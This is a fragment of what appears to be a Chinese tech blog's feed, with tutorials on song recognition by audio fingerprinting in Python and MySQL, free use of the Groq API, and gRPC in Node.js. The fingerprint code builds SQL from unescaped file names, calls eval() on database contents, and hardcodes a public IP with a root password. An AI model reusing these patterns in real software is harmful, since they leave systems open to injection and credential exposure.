class="number">120</span>:<span class="number">180</span>]) + <span class="number">120</span>,</span><br><span class="line">                                    <span class="comment"># np.argmax(fft_blocks[-1][180:300]) + 180,</span></span><br><span class="line">                                    ))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">play</span>(<span class="params">self, filepath</span>):</span><br><span class="line">        chunk = <span class="number">1024</span></span><br><span class="line">        wf = wave.<span class="built_in">open</span>(filepath, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">        p = pyaudio.PyAudio()</span><br><span class="line">        stream = p.<span class="built_in">open</span>(<span class="built_in">format</span>=p.get_format_from_width(wf.getsampwidth()),</span><br><span class="line">                        channels=wf.getnchannels(),</span><br><span class="line">                        rate=wf.getframerate(),</span><br><span class="line">                        output=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data = wf.readframes(chunk)</span><br><span class="line">            <span class="keyword">if</span> data == <span class="string">&quot;&quot;</span>: <span class="keyword">break</span></span><br><span class="line">            stream.write(data)</span><br><span class="line">            stream.close()</span><br><span class="line">            p.terminate()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    p = voice()</span><br><span class="line">    p.loaddata(<span class="string">&quot;./music01.wav&quot;</span>)</span><br><span class="line">    <span class="comment"># p.play(&#x27;temp/1.wav&#x27;)</span></span><br><span class="line"><span class="built_in">print</span>(p.name)</span><br></pre></td></tr></table></figure><p>将提取到的音频文件特质特征关联到新建数据库里的数据表中（即声音指纹数据） </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> pymysql <span class="keyword">as</span> MySQLdb</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">memory</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, host, port, user, passwd, db</span>):</span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = port</span><br><span class="line">        self.user = user</span><br><span class="line">        self.passwd = passwd</span><br><span class="line">        self.db = db</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">addsong</span>(<span class="params">self, path</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(path) != <span class="built_in">str</span>:</span><br><span class="line">            <span class="keyword">raise</span> TypeError  <span class="comment"># , &#x27;path need string&#x27;</span></span><br><span class="line">        basename = os.path.basename(path)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            conn = MySQLdb.connect(host=self.host, port=self.port, user=self.user, passwd=self.passwd, db=self.db,</span><br><span class="line">                                   charset=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;DataBase error&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        cur = conn.cursor()</span><br><span class="line">        namecount = cur.execute(<span class="string">&quot;select * from fingerprint WHERE song_name = &#x27;%s&#x27;&quot;</span> % basename)</span><br><span class="line">        <span class="keyword">if</span> namecount &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;the song has been record!&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        v = voice()</span><br><span class="line">        v.loaddata(path)</span><br><span class="line">        v.fft()</span><br><span class="line">        cur.execute(<span class="string">&quot;insert into fingerprint VALUES(&#x27;%s&#x27;,&#x27;%s&#x27;)&quot;</span> % (basename, v.high_point.__str__()))</span><br><span class="line">        conn.commit()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Added to database:%s&#x27;</span> % (basename))</span><br><span class="line">        cur.close()</span><br><span class="line">        conn.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fp_compare</span>(<span class="params">self, search_fp, match_fp</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(search_fp) &gt; <span class="built_in">len</span>(match_fp):</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        max_similar = <span class="number">0</span></span><br><span class="line">        search_fp_len = <span class="built_in">len</span>(search_fp)</span><br><span class="line">        match_fp_len = <span class="built_in">len</span>(match_fp)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(match_fp_len - search_fp_len):</span><br><span class="line">            temp = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(search_fp_len):</span><br><span class="line">                <span class="keyword">if</span> match_fp[i + j] == search_fp[j]:</span><br><span class="line">                    temp += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> temp &gt; max_similar:</span><br><span class="line">                max_similar = temp</span><br><span class="line">        <span class="keyword">return</span> max_similar</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">search</span>(<span class="params">self, path</span>):</span><br><span class="line">        v = voice()</span><br><span class="line">        v.loaddata(path)</span><br><span class="line">        v.fft()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            conn = MySQLdb.connect(host=self.host, port=self.port, user=self.user, passwd=self.passwd, db=self.db,</span><br><span class="line">                                   charset=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">raise</span> IOError</span><br><span class="line">        cur = conn.cursor()</span><br><span class="line">        cur.execute(<span class="string">&quot;SELECT * FROM fingerprint&quot;</span>)</span><br><span class="line">        result = cur.fetchall()</span><br><span class="line">        compare_res = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">            compare_res.append((self.fp_compare(v.high_point[:-<span class="number">1</span>], <span class="built_in">eval</span>(i[<span class="number">1</span>])), i[<span class="number">0</span>]))</span><br><span class="line">        compare_res.sort(reverse=<span class="literal">True</span>)</span><br><span class="line">        cur.close()</span><br><span class="line">        conn.close()</span><br><span class="line">        <span class="built_in">print</span>(compare_res)</span><br><span class="line">        <span class="keyword">return</span> compare_res</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">search_and_play</span>(<span class="params">self, path</span>):</span><br><span class="line">        v = voice()</span><br><span class="line">        v.loaddata(path)</span><br><span class="line">        v.fft()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            conn = MySQLdb.connect(host=self.host, port=self.port, user=self.user, passwd=self.passwd, db=self.db,</span><br><span class="line">                                   charset=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;DataBase error&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        cur = conn.cursor()</span><br><span class="line">        cur.execute(<span class="string">&quot;SELECT * FROM fingerprint&quot;</span>)</span><br><span class="line">        result = cur.fetchall()</span><br><span class="line">        compare_res = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">            compare_res.append((self.fp_compare(v.high_point[:-<span class="number">1</span>], <span class="built_in">eval</span>(i[<span class="number">1</span>])), i[<span class="number">0</span>]))</span><br><span class="line">        compare_res.sort(reverse=<span class="literal">True</span>)</span><br><span class="line">        cur.close()</span><br><span class="line">        conn.close()</span><br><span class="line">        <span class="built_in">print</span>(compare_res)</span><br><span class="line">        <span class="comment"># v.play(compare_res[0][1])</span></span><br><span class="line">        <span class="keyword">return</span> compare_res</span><br><span class="line"></span><br><span class="line">    <span class="comment"># sss.addsong(&#x27;taiyangzhaochangshengqi.wav&#x27;)</span></span><br><span class="line">    <span class="comment"># sss.addsong(&#x27;beiyiwangdeshiguang.wav&#x27;)</span></span><br><span class="line">    <span class="comment"># sss.addsong(&#x27;xiaozezhenger.wav&#x27;)</span></span><br><span class="line">    <span class="comment"># sss.addsong(&#x27;nverqing.wav&#x27;)</span></span><br><span class="line">    <span class="comment"># sss.addsong(&#x27;the_mess.wav&#x27;)</span></span><br><span class="line">    <span class="comment"># sss.addsong(&#x27;windmill.wav&#x27;)</span></span><br><span class="line">    <span class="comment"># sss.addsong(&#x27;end_of_world.wav&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sss = memory(<span class="string">&#x27;1.94.241.19&#x27;</span>, <span class="number">3306</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;Huawei@2023&#x27;</span>, <span class="string">&#x27;singdb&#x27;</span>)</span><br><span class="line">sss.addsong(<span class="string">&#x27;./music01.wav&#x27;</span>)</span><br><span class="line">sss.addsong(<span class="string">&#x27;./music02.wav&#x27;</span>)</span><br><span class="line">sss.addsong(<span class="string">&#x27;./music03.wav&#x27;</span>)</span><br><span class="line">sss.addsong(<span class="string">&#x27;./music04.wav&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>此时将获取到的声音指纹存储在数据库singdb的表fingerprint中（注意：代码中的弹性公网IP、端口号、root密码要根据实际配置的内容进行更改）。</p><p>数据库查询<br>select</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">song_name fq</span><br><span class="line">music01.wav</span><br><span class="line">[(0, 73, 80, 132), (5, 76, 112, 135), (4, 52, 112, 135), (7, 76, 112, 135), (4, 74, 119, 135), (7, 76, 119, 135)... ]</span><br><span class="line">music02.wav</span><br><span class="line">[(0, 40, 80, 120), (6, 40, 98, 130), (3, 68, 88, 122), (5, 73, 93, 144), (3, 51, 92, 143), (3, 62, 92, 159)...]</span><br></pre></td></tr></table></figure><p>对抖音短视频进行处理，提取其中的音频信息（这里音频格式可以为mp3、wav等，这里建议选择wav格式）。 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> moviepy.editor <span class="keyword">import</span> *</span><br><span class="line">video = VideoFileClip(<span class="string">&#x27;example01.mp4&#x27;</span>)</span><br><span class="line">audio = video.audio</span><br><span class="line">audio.write_audiofile(<span class="string">&#x27;example01.wav&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>执行代码，结果显示，此时查看文件夹中已经生成对应的“example01.wav”音频文件。</p><p>验证结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sss = memory(<span class="string">&#x27;EIP&#x27;</span>, <span class="number">3306</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;Huawei@2023&#x27;</span>, <span class="string">&#x27;singdb&#x27;</span>)</span><br><span class="line">res = sss.search_and_play(<span class="string">&#x27;example01.wav&#x27;</span>)</span><br><span class="line">score = <span class="built_in">max</span>(res)</span><br><span class="line"><span class="keyword">if</span> score[<span class="number">0</span>]&lt;<span class="number">1000</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Not Found&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Song Name&quot;</span>,score[<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>执行代码，结果显示已经识别出“example01”音频的歌曲名。<br>结果 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[(1578, <span class="string">&#x27;music02.wav&#x27;</span>), (0, <span class="string">&#x27;music04.wav&#x27;</span>), (0, <span class="string">&#x27;music03.wav&#x27;</span>), (0, <span class="string">&#x27;music01.wav&#x27;</span>)]</span><br><span class="line">Song Name music02.wav</span><br></pre></td></tr></table></figure><p>test.py,点击Run ‘test’,或者快捷键ctrl+Shift+f10运行python文件。</p><!---https://edu.huaweicloud.com/signup/886816346f6442c69234c053760e513als1https://connect.huaweicloud.com/courses/learn/C101731050536557276/about 华为云官方网站https://www.huaweicloud.com/华为云帮助中心https://support.huaweicloud.com/index.html华为云学院https://edu.huaweicloud.com/用 “开始前请复述我的需求，等我确认后继续” 减少理解上的误会。用 “不要改动其他模块的 UI 结构样式 和 逻辑” 降低 AI 乱改代码频率。https://edu.huaweicloud.com/signup/886816346f6442c69234c053760e513a-->]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;听歌识曲&quot;&gt;&lt;a href=&quot;#听歌识曲&quot; class=&quot;headerlink&quot; title=&quot;听歌识曲&quot;&gt;&lt;/a&gt;听歌识曲&lt;/h1&gt;&lt;p&gt;抖音小视频背景音乐识别&lt;/p&gt;
&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; t</summary>
      
    
    
    
    <category term="技术" scheme="https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="python" scheme="https://banjinmei.github.io/tags/python/"/>
    
    <category term="AI" scheme="https://banjinmei.github.io/tags/AI/"/>
    
  </entry>
  
  <entry>
    <title>llama-3.3-70b-versatile</title>
    <link href="https://banjinmei.github.io/2024/12/10/llama-3-3-70b-versatile/"/>
    <id>https://banjinmei.github.io/2024/12/10/llama-3-3-70b-versatile/</id>
    <published>2024-12-10T14:32:02.000Z</published>
    <updated>2024-12-10T14:33:06.834Z</updated>
    
    <content type="html"><![CDATA[<h1 id="llama-3-3-70b-versatile"><a href="#llama-3-3-70b-versatile" class="headerlink" title="llama-3.3-70b-versatile"></a>llama-3.3-70b-versatile</h1><h1 id="Groq-API-免费使用教程"><a href="#Groq-API-免费使用教程" class="headerlink" title="Groq API 免费使用教程"></a>Groq API 免费使用教程</h1><h2 id="第一步：获取-API"><a href="#第一步：获取-API" class="headerlink" title="第一步：获取 API"></a>第一步：获取 API</h2><ol><li>访问 <a class="link"   href="https://console.groq.com/" >https://console.groq.com/<i class="fas fa-external-link-alt"></i></a></li><li>完成注册并申请 API  -&gt; googlemail</li><li>保存获得的 API 密钥</li></ol><h2 id="第二步：配置-NextChat"><a href="#第二步：配置-NextChat" class="headerlink" title="第二步：配置 NextChat"></a>第二步：配置 NextChat</h2><ol><li>打开 <a class="link"   href="https://app.nextchat.dev/" >https://app.nextchat.dev/<i class="fas fa-external-link-alt"></i></a><br><a class="link"   href="https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web" >https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web<i class="fas fa-external-link-alt"></i></a></li><li>在左侧设置中填入：<br>设置-&gt;模型服务商-&gt;Google<br>设置-&gt;自定义接口<br>模型(model)  llama-3.3-70b-versatile<ul><li>接口地址：<code>https://api.groq.com/openai/</code>       </li><li>API Key：填入之前获取的密钥</li><li>自定义模型：<code>llama-3.3-70b-versatile</code></li></ul></li></ol><h2 id="主要优势"><a href="#主要优势" class="headerlink" title="主要优势"></a>主要优势</h2><ul><li>响应速度：200 Token&#x2F;秒</li><li>性能表现：接近 GPT-4.0 水平</li><li>完全免费使用</li></ul><h2 id="使用限制"><a href="#使用限制" class="headerlink" title="使用限制"></a>使用限制</h2><ul><li>每分钟限额：6000 Token</li><li>每日 API 调用：14000 次</li><li>足够普通用户日常使用</li></ul><p>gsk_U2MI0vooKS4JyCtmNMLHWGdyxxxfqo</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">提问：你是什么大模型</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">回答：</span><br><span class="line">我是人工智能模型，特别是一种大型语言模型。我的主要功能是理解和生成类似人类的文本。我的训练数据包括了大量的文本信息，这使我能够学习语言的模式和结构，并根据这个学习生成类似人类的回答。</span><br><span class="line"></span><br><span class="line">我的能力包括但不限于：</span><br><span class="line"></span><br><span class="line">回答问题：我可以根据我的训练数据回答广泛的题目，从科学和历史到娱乐和文化。</span><br><span class="line">生成文本：我可以根据给定的提示或主题生成文本，包括文章、故事、诗歌等。</span><br><span class="line">翻译：我可以进行语言之间的翻译，例如从英语翻译到西班牙语、法语、德语等。</span><br><span class="line">摘要：我可以将长篇文本摘要为简短的摘要，帮助用户快速理解主要内容。</span><br><span class="line">对话：我可以与用户进行对话，回答问题，提供信息，甚至参与辩论。</span><br><span class="line">我的优势在于能够快速处理和生成大量信息，但是我的能力也受到训练数据的限制。因此，我可能无法总是提供完全准确或最新的信息。然而，我会尽力提供最好的答案和帮助。</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;llama-3-3-70b-versatile&quot;&gt;&lt;a href=&quot;#llama-3-3-70b-versatile&quot; class=&quot;headerlink&quot; title=&quot;llama-3.3-70b-versatile&quot;&gt;&lt;/a&gt;llama-3.3-70b-ver</summary>
      
    
    
    
    <category term="技术" scheme="https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="llama" scheme="https://banjinmei.github.io/tags/llama/"/>
    
    <category term="AI" scheme="https://banjinmei.github.io/tags/AI/"/>
    
  </entry>
  
  <entry>
    <title>gRPC</title>
    <link href="https://banjinmei.github.io/2024/12/09/gRPC/"/>
    <id>https://banjinmei.github.io/2024/12/09/gRPC/</id>
    <published>2024-12-09T15:18:09.000Z</published>
    <updated>2024-12-09T15:37:12.296Z</updated>
    
    <content type="html"><![CDATA[<h1 id="gRPC（Google-Remote-Procedure-Call）"><a href="#gRPC（Google-Remote-Procedure-Call）" class="headerlink" title="gRPC（Google Remote Procedure Call）"></a>gRPC（Google Remote Procedure Call）</h1><p>是一个高性能、开源和通用的RPC框架，最初由Google开发。它使用HTTP&#x2F;2作为传输协议，并默认采用Protocol Buffers作为接口定义语言（IDL）和消息格式。gRPC支持多种编程语言，包括但不限于C++、Java、Python、Go、Ruby、C#、Node.js、PHP等。</p><h1 id="gRPC-特点："><a href="#gRPC-特点：" class="headerlink" title="gRPC 特点："></a>gRPC 特点：</h1><p><strong>高效的数据交换</strong>：通过使用Protocol Buffers（Protobuf），gRPC能够以二进制形式序列化和反序列化数据，这比JSON或XML等文本格式更紧凑、更快。<br><strong>双向流式通信</strong>：gRPC支持四种不同的调用类型：简单RPC、服务器端流式RPC、客户端流式RPC以及双向流式RPC。这使得开发者可以灵活选择最适合其应用场景的通信模式。<br><strong>HTTP&#x2F;2</strong>：gRPC基于HTTP&#x2F;2构建，这意味着它可以利用HTTP&#x2F;2提供的特性，如多路复用、头部压缩、流量控制等，来提高性能和可靠性。<br><strong>跨平台支持</strong>：gRPC可以在多种环境中运行，包括云服务、本地部署、移动端等，并且对各种编程语言都有良好的支持，便于构建跨平台的应用程序。<br><strong>插件系统</strong>：gRPC提供了一个插件系统，允许用户自定义代码生成逻辑，或者添加额外的功能，如认证、日志记录、监控等。<br><strong>强大的社区和生态系统</strong>：由于它是Google的产品并且被广泛采用，因此拥有一个活跃的社区和丰富的第三方库与工具生态系统。</p><h1 id="gRPC-场景："><a href="#gRPC-场景：" class="headerlink" title="gRPC 场景："></a>gRPC 场景：</h1><p>gRPC的使用场景非常广泛，尤其适用于需要高效、可靠和高性能通信的应用程序。以下是gRPC的一些典型使用场景：</p><h2 id="1-微服务架构"><a href="#1-微服务架构" class="headerlink" title="1. 微服务架构"></a>1. 微服务架构</h2><p>服务间通信：在微服务架构中，不同的服务可能使用不同的编程语言实现，并且需要高效地相互交流。gRPC以其跨语言支持和高效的二进制协议（Protocol Buffers），成为构建微服务之间通信层的理想选择。<br>负载均衡：gRPC原生支持客户端负载均衡，可以帮助分散请求到多个服务实例上，提高系统的可用性和性能。</p><h2 id="2-实时应用程序"><a href="#2-实时应用程序" class="headerlink" title="2. 实时应用程序"></a>2. 实时应用程序</h2><p>双向流式通信：gRPC的双向流特性非常适合用于实时应用程序，如聊天应用、在线游戏、视频会议等，其中客户端和服务端需要持续地交换数据。<br>实时数据推送：对于需要从服务器向客户端推送实时更新的应用，例如股票行情、社交媒体通知、物联网设备状态更新等，gRPC的服务端流式RPC可以有效地实现这一需求。</p><h2 id="3-移动应用与后端通信"><a href="#3-移动应用与后端通信" class="headerlink" title="3. 移动应用与后端通信"></a>3. 移动应用与后端通信</h2><p>轻量级性能：由于其高效的序列化机制和较低的网络开销，gRPC特别适合移动应用与后端服务器之间的通信，特别是在网络条件不佳的情况下，能够减少电量消耗并提高响应速度。<br>快速开发：gRPC自动生成客户端和服务端代码的能力，大大简化了开发流程，尤其是在多平台开发环境中，减少了重复劳动。</p><h2 id="4-跨语言通信"><a href="#4-跨语言通信" class="headerlink" title="4. 跨语言通信"></a>4. 跨语言通信</h2><p>多语言环境：gRPC支持多种编程语言，使得它非常适合用于跨语言通信的场景。不同团队或项目可以使用各自熟悉的技术栈，同时通过gRPC进行无缝集成。<br>异构系统集成：当需要将遗留系统与现代应用集成时，gRPC的跨语言能力可以帮助桥接这些系统，促进信息的流动和交互。</p><h2 id="5-分布式系统"><a href="#5-分布式系统" class="headerlink" title="5. 分布式系统"></a>5. 分布式系统</h2><p>节点间通信：在分布式系统中，各节点之间的通信是至关重要的。gRPC提供的高效率和可靠性使其成为分布式计算、任务分发、集群管理等场景下的首选通信框架。<br>数据同步：gRPC可以用来实现实时的数据同步，确保分布式系统中的所有节点都拥有最新的数据副本。</p><h2 id="6-容器化环境"><a href="#6-容器化环境" class="headerlink" title="6. 容器化环境"></a>6. 容器化环境</h2><p>服务发现：在Kubernetes等容器编排平台上，gRPC可以通过服务发现机制自动找到其他服务，简化了容器间的通信配置。<br>轻量级部署：gRPC的轻量级特性和对多语言的支持，使其非常适合容器化部署，有助于提升资源利用率和服务扩展性。</p><h2 id="7-API后端服务"><a href="#7-API后端服务" class="headerlink" title="7. API后端服务"></a>7. API后端服务</h2><p>高性能API：许多大型互联网公司使用gRPC来构建其API后端服务，因为它提供了高性能、可扩展性和易于维护的方式来处理客户端请求。<br>类型安全：gRPC的IDL（接口定义语言）定义了严格的服务契约，保证了服务端和客户端之间的调用是类型安全的，减少了运行时错误的发生。</p><h2 id="8-物联网（IoT）"><a href="#8-物联网（IoT）" class="headerlink" title="8. 物联网（IoT）"></a>8. 物联网（IoT）</h2><p>低资源消耗：gRPC的高效性能和紧凑的消息格式，使得它成为连接IoT设备和传感器的理想通信协议，能够在有限的计算和网络资源下提供可靠的通信。<br>实时监控与控制：gRPC的流式API非常适合用于实时监控和控制IoT设备，如智能家居系统、工业自动化等场景。</p><h2 id="9-大数据和机器学习"><a href="#9-大数据和机器学习" class="headerlink" title="9. 大数据和机器学习"></a>9. 大数据和机器学习</h2><p>数据传输：在大数据处理和机器学习训练过程中，gRPC可以用来高效地传输大量数据，特别是当数据需要在不同的计算节点之间传递时。<br>模型服务：gRPC常被用于构建机器学习模型的服务化接口，允许客户端以高效的方式查询模型预测结果。<br>综上所述，gRPC是一个灵活且强大的通信框架，适用于各种需要高效、可靠通信的场景。无论是构建复杂的微服务架构，还是简单的客户端-服务器应用，gRPC都能提供显著的优势。</p><h1 id="Node-js-gRPC"><a href="#Node-js-gRPC" class="headerlink" title="Node.js gRPC"></a>Node.js gRPC</h1><p> 创建和调用 gRPC 服务。包括服务器和客户端实现。</p><h2 id="1-安装必要的包"><a href="#1-安装必要的包" class="headerlink" title="1. 安装必要的包"></a>1. 安装必要的包</h2><p>在项目目录下执行以下命令安装 gRPC 相关依赖：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install @grpc/grpc-js @grpc/proto-loader</span><br></pre></td></tr></table></figure><h2 id="2-创建-proto-文件"><a href="#2-创建-proto-文件" class="headerlink" title="2. 创建 proto 文件"></a>2. 创建 proto 文件</h2><p>创建一个文件 example.proto 定义 gRPC 服务和消息结构：</p><p>proto</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"></span><br><span class="line">service <span class="title class_">ExampleService</span> &#123;</span><br><span class="line">  rpc <span class="title class_">SayHello</span> (<span class="title class_">HelloRequest</span>) returns (<span class="title class_">HelloReply</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message <span class="title class_">HelloRequest</span> &#123;</span><br><span class="line">  string name = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message <span class="title class_">HelloReply</span> &#123;</span><br><span class="line">  string message = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-实现-gRPC-服务器"><a href="#3-实现-gRPC-服务器" class="headerlink" title="3. 实现 gRPC 服务器"></a>3. 实现 gRPC 服务器</h2><p>创建一个文件 server.js，实现 gRPC 服务：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> grpc = <span class="built_in">require</span>(<span class="string">&#x27;@grpc/grpc-js&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> protoLoader = <span class="built_in">require</span>(<span class="string">&#x27;@grpc/proto-loader&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加载 proto 文件</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PROTO_PATH</span> = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;example.proto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> 